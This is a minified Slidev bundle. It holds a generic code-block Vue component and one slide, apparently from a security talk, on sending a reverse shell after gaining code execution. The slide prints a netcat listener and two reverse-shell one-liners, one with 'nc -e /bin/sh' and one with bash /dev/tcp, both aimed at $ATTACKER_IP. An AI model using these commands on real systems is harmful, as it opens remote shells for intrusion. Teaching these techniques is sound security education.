import{w as P,x as q}from"../modules/unplugin-icons-BakdvmhU.js";import{d as z,t as R,at as T,B as w,a1 as O,I as x,au as F,b as S,f as K,z as h,c as f,g as M,i as W,h as j,o as r,k as d,q as U,s as Y,l as k,m as u,e}from"../modules/vue--2rrS9jf.js";import{c as L,Y as G,$ as J,a0 as Q,b as D,a1 as V}from"../index-BQcGyKHg.js";import{u as E,p as X,f as Z}from"./context-BHutlHGZ.js";import{I as ee}from"./default-3Q0-Oawp.js";import"../modules/shiki-BQ1XKe-f.js";const se=["title"],te=z({__name:"CodeBlockWrapper",props:{ranges:{type:Array,default:()=>[]},finally:{type:[String,Number],default:"last"},startLine:{type:Number,default:1},lines:{type:Boolean,default:L.lineNumbers},at:{type:[String,Number],default:"+1"},maxHeight:{type:String,default:void 0}},setup(_){const s=_,{$clicksContext:a}=E(),t=R(),m=G();T(()=>{a.unregister(m)}),w(()=>{var i;(i=t.value)==null||i.classList.toggle("slidev-code-line-numbers",s.lines)}),O(()=>{var v;if(!a||a.disabled||!((v=s.ranges)!=null&&v.length))return;const{start:i,end:l,delta:o}=a.resolve(s.at,s.ranges.length-1);a.register(m,{max:l,delta:o});const c=x(()=>a.disabled?s.ranges.length-1:Math.max(0,a.current-i+1)),p=x(()=>s.finally==="last"?s.ranges.at(-1):s.finally.toString());w(()=>{if(!t.value)return;let g=s.ranges[c.value]??p.value;const C=g==="hide";t.value.classList.toggle(J,C),C&&(g=s.ranges[c.value+1]??p.value);const b=t.value.querySelector(".shiki"),B=Array.from(b.querySelectorAll("code > .line")),$=B.length;if(Q(g,$,s.startLine,n=>[B[n]]),s.maxHeight){const n=Array.from(b.querySelectorAll(".line.highlighted"));n.reduce((A,H)=>H.offsetHeight+A,0)>t.value.offsetHeight?n[0].scrollIntoView({behavior:"smooth",block:"start"}):n.length>0&&n[Math.round((n.length-1)/2)].scrollIntoView({behavior:"smooth",block:"center"})}})});const{copied:y,copy:I}=F();function N(){var l,o;const i=(o=(l=t.value)==null?void 0:l.querySelector(".slidev-code"))==null?void 0:o.textContent;i&&I(i)}return(i,l)=>{const o=P,c=q;return r(),S("div",{ref_key:"el",ref:t,class:W(["slidev-code-wrapper relative group",{"slidev-code-line-numbers":s.lines}]),style:j({"max-height":s.maxHeight,"overflow-y":s.maxHeight?"scroll":void 0,"--start":s.startLine})},[K(i.$slots,"default"),h(L).codeCopy?(r(),S("button",{key:0,class:"slidev-code-copy absolute top-0 right-0 transition opacity-0 group-hover:opacity-20 hover:!opacity-100",title:h(y)?"Copied":"Copy",onClick:l[0]||(l[0]=p=>N())},[h(y)?(r(),f(o,{key:0,class:"p-2 w-8 h-8"})):(r(),f(c,{key:1,class:"p-2 w-8 h-8"}))],8,se)):M("v-if",!0)],6)}}}),ie=D(te,[["__file","/opt/homebrew/lib/node_modules/@slidev/cli/node_modules/@slidev/client/builtin/CodeBlockWrapper.vue"]]),ae=e("h1",null,"Let’s send it",-1),le=e("p",null,"Once we have a means to execute code on the target machine, we can send a reverse shell payload.",-1),ne=e("p",null,"On the attacker machine:",-1),oe=e("pre",{class:"shiki shiki-themes Vitesse Dark Vitesse Light slidev-code",style:{"--shiki-dark":"#dbd7ca","--shiki-light":"#393a34","--shiki-dark-bg":"#121212","--shiki-light-bg":"#ffffff"}},[e("code",{class:"language-sh"},[e("span",{class:"line"},[e("span",{style:{"--shiki-dark":"#A1B567","--shiki-light":"#6C7834"}},"nc"),e("span",{style:{"--shiki-dark":"#D4976C","--shiki-light":"#A65E2B"}}," -lvp"),e("span",{style:{"--shiki-dark":"#6394BF","--shiki-light":"#296AA3"}}," 4444")])])],-1),re=e("p",null,"On the target machine:",-1),he=e("pre",{class:"shiki shiki-themes Vitesse Dark Vitesse Light slidev-code",style:{"--shiki-dark":"#dbd7ca","--shiki-light":"#393a34","--shiki-dark-bg":"#121212","--shiki-light-bg":"#ffffff"}},[e("code",{class:"language-sh"},[e("span",{class:"line"},[e("span",{style:{"--shiki-dark":"#A1B567","--shiki-light":"#6C7834"}},"nc"),e("span",{style:{"--shiki-dark":"#D4976C","--shiki-light":"#A65E2B"}}," -e"),e("span",{style:{"--shiki-dark":"#C98A7D","--shiki-light":"#B56959"}}," /bin/sh"),e("span",{style:{"--shiki-dark":"#B8A965","--shiki-light":"#8C862B"}}," $ATTACKER_IP"),e("span",{style:{"--shiki-dark":"#6394BF","--shiki-light":"#296AA3"}}," 4444")])])],-1),ce=e("p",null,"Or because we don’t want to rely on the target machine having a version of netcat with exec support:",-1),de=e("pre",{class:"shiki shiki-themes Vitesse Dark Vitesse Light slidev-code",style:{"--shiki-dark":"#dbd7ca","--shiki-light":"#393a34","--shiki-dark-bg":"#121212","--shiki-light-bg":"#ffffff"}},[e("code",{class:"language-sh"},[e("span",{class:"line"},[e("span",{style:{"--shiki-dark":"#A1B567","--shiki-light":"#6C7834"}},"bash"),e("span",{style:{"--shiki-dark":"#D4976C","--shiki-light":"#A65E2B"}}," -i"),e("span",{style:{"--shiki-dark":"#CB7676","--shiki-light":"#AB5959"}}," >&"),e("span",{style:{"--shiki-dark":"#C98A7D","--shiki-light":"#B56959"}}," /dev/tcp/"),e("span",{style:{"--shiki-dark":"#B8A965","--shiki-light":"#8C862B"}},"$ATTACKER_IP"),e("span",{style:{"--shiki-dark":"#C98A7D","--shiki-light":"#B56959"}},"/4444"),e("span",{style:{"--shiki-dark":"#CB7676","--shiki-light":"#AB5959"}}," 0>&1")])])],-1),pe=e("p",null,"Now we’re living off the land and have zero dependencies! (outside of network egress)",-1),ge={__name:"4",setup(_){return X(V),E(),(s,a)=>{const t=ie;return r(),f(ee,U(Y(h(Z)(h(V),3))),{default:d(()=>[ae,le,ne,k(t,u({},{ranges:[]}),{default:d(()=>[oe]),_:1},16),re,k(t,u({},{ranges:[]}),{default:d(()=>[he]),_:1},16),ce,k(t,u({},{ranges:[]}),{default:d(()=>[de]),_:1},16),pe]),_:1},16)}}},Ce=D(ge,[["__file","/@slidev/slides/4.md"]]);export{Ce as default};
